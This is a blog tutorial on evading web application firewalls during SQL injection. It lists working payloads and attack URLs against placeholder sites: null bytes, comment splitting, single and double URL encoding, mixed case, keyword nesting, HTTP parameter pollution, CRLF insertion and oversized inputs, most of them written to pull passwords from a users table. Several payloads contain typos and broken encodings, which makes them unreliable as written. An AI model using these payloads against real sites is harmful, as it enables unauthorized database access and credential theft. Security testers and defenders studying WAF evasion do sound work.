---
layout: post
title:  "SQL Injection WAF bypass techniques"
date:   2020-12-12 17:12:34 -0300
categories: hacking
---

HI, People In this basic tutorial, I want to show you a little bit of SQL Injection WAF bypass, I know it is a subject that is well commented and discussed every day .. after all, WAFS are boring :/ and in the end .. they just work as a superficial protection for an environment (in my opnion it is like a leaky bucket that you fix with bubble gum) .. So without further waiting .. here are some manual WAF bypass techniques. If you want more about it, leave a Tweet @incogbyte ;)


*SQL injection attacks common uses some SQL keywords such as:*


```sql

SELECT, INSERT, FROM, UPDATE, WHERE, ALTER, SELECT, SHUTDOWN, DROP, DELETE FROM, ‘, -

```

* Nullbyte bypass:

To perform a nullbyte attack, you simply need to supply a URL encoded nullbyte %00 prior to any char that the filter is blocking, example

```sql

'UNION SELECT password FROM Users WHERE username-'jodson'--
```

Using the the Nullbyte technique to bypass will be

```sql

%00' UNION SELECT password FROM Users WHERE username-'jodson'--
```

* SQL comments

You can use sql inline comments sequences to create snippets of SQL, using this technique you can bypass various filters, example:

```sql

'/**/UNION/**/SELECT/**/password/**/FROM/**/USERS/**/WHERE/**/username/**/LIKE/**/'jodson'--
```

*  Inline MySQL DB attacking string above, could be re-written like bellow:

```sql

'/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/OM/**/Users/**/WHE/**/RE/**/usersame/**/LIKE/**/'jodson'-- 

```
obs: MySQL needs a whitespace after comment such as space, tab, newline etc.

* URL encoding:

URL encoding is a versatile technique that you can use to bypass many kinds of filter, the most basic form. Only replace the char that you need with ASCII code in hexadecimal preceded by % character

EX: single quote ( ‘ ) 0x27 the representation %27

```sql

'%2f%2fa*/UNION%2fa%2a*/SELECT%2f%2a*/password%2f%2a*/FROM%2f%2a*/Users%2f%2a*/WHERE%2f%2a*/username%2f%2a*/'jodson'-- 

```

/ URL encoded to %2f

* URL encoded to %2a

Note: Sometime this technique will not work, so you can bypass with Double URL-encode. In the double-encoded attac, the % character in the original attack is itself URL-enced in the normal way (as %25) s0 that double URL-encoded form of single quotation mark is %2527. Example:

```sql
%252f%252a*/UNION%252f%252a*/SELECT%252f%252a*/password%252f%252a*/FROM%252f%252a*/Users%252f%25a*/WHERE%252f%252a*/username%252f%252a*/LIKE%252f%252a*/'jodson'-- 

```

After that double-URL-encoding will be decode the input.


* Changing Cases

Some WAFS don’t have any rule or signatures to detect upper cases. Example:

```sql
uNiOn ALl sElEcT
 SeLecT UsEr FrOm DuAL

 https://www.xxx.com/a.php?id=1 UniOn AlL SeLeCt/*inc0gbyt3*/select/**/1,2,3,4,5 -- 
```

* Encode to Hex Forbidden:

We do that with: /%2A%2A/ and %2F**%2F


```sql
https://www.xxx.com/News/notice_id.php?=id=1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 -- 


  https://www.xxx.com/News/notice_id.php?id=212%2F**%2Funion%2F**%2Fselect%2F**%2F1,2,3,4,5,6 -- 
```

* Replacing keywords

These technique, we have to know the waf filters.. Example:

```sql
+UnIoN+SeLselectECT+
 https://www.xxx.com/artigos.php?id=123+UnIoN+SeLselectECT+1,2,3,4,5-- 
```

the WAF will filter those keys and the UNI and ON and SEL and ECT form one word again.


* WAF Bypassing - using characters

Characters like

```sql
| ? " ' * % [] ; \ $ () £ ¢

```


By using theses chars in lots of cases /*$*/ is not filtered, but the sign * is replaced with something (space most of cases). ex:

```sql
 https://www.xxx.com/index.php?id=1+uni*on+sel*ect+1,3,4,5--+- 
```


It’s like splitting but, in this case ONLY * is filtered out by WAF


* HTTP Parameter Pollution (HPP)

HTTP parameter pollution is a web technique evasion that allows an attacker to craft a HTTP request, repeating all parameters of request

```sql
Regular attack SQLi https://www.xxx.com/noticias.php?id=1 union select 1,2 -- 

 HPP attack + SQLi: https://www.xxx.com/noticias.php?id=1&id=*/union/*&id=*/select/*&id=*/1,2+--+

```

* CRLF WAF Bypass (Carriage Return, Line Feed) - Common on (aspx	asp) applications

Putting theses chars at the beggining of payload

```sql
%0A%0d+select+user+from+dual+%0A%0D

https://www.xxx.com/noticias.php?id=20%0A%0D/*/%0A%0Dunion*/%0A%0D/*!50000select*/%0A%0D/*!+1337,1338,unhex(hex(/*!password*/)),1337+from+/*'users'*/--+-

https://wwww.xxx.com/mimice.php?id=26%0A%0Dunion%0A%0D+%0A%0D+%0A%0Dselect+%0A%0D+1,2,3,4,5+--+-

```

* Buffer Overflow bypassing

Majority of WAFS are written with low level langagues like C. A bufferoverflow occurs when a program or process tries to store more data in a buffer (temporary storage data) than it was intended to hold.

Example:

```sql
and (select 1) = (select 0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA ..... A's)

```

this AAAAA it’s more than 8000 :P

```sql
+and+(/*50000select*/1) = (/*!32302select*/0xAAAAAAAAAAAAAAAAAAAAAAAAAA.....)+

```

In URL:

```sql
https://www.xxx.noticias.php?id=200'+and(/*60000select*/1)-(/*!3200select*/0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+and 0 union select 1, version(), 3,4,5,6,7,8,9 --+

```

* Author: inc0gbyt3 
* Thanks to: blackrose and N Aziz

